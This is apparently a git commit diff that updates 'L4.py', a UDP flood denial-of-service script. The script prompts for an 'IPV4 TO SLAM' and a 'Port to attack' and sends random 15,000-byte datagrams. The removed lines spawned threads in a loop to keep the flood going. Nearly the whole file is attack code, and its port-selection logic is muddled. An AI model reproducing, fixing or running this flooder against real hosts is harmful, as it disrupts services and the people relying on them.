60903412163a992352a3e957d1ba1d21626c6d32
ACKER POSIDEN <94275268+dev17V@users.noreply.github.com>
2024-02-28 20:53:24 -0600

    Update L4.py

--- L4.py
+++ L4.py
@@ -1,17 +1,12 @@
-#BEST UDP METHOD IN COM
-import threading,socket,random,time,sys,os
+import socket
+import random
 
 def FLOOD():
     ip = input("IPV4 TO SLAM: ")
-    port = [22, 80, 443, 8080, 1]
-    randport=(True,False)[port==0]
-    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-    bytes=random._urandom(15000)
-    port=(random.randint(1,15000000),port)[randport]
-    s.sendto(bytes,(ip,port))
-    while True:
-        t1 = threading.Thread(target=FLOOD)
-        t1.start()
-        t2 = threading.Thread(target=FLOOD)
-        t2.start()
+    port = int(input("Port to attack: "))
+    randport = (True, False)[port == 0]
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes_data = random._urandom(15000)
+    port = (random.randint(1, 15000000), port)[randport]
+    s.sendto(bytes_data, (ip, port))
 FLOOD()
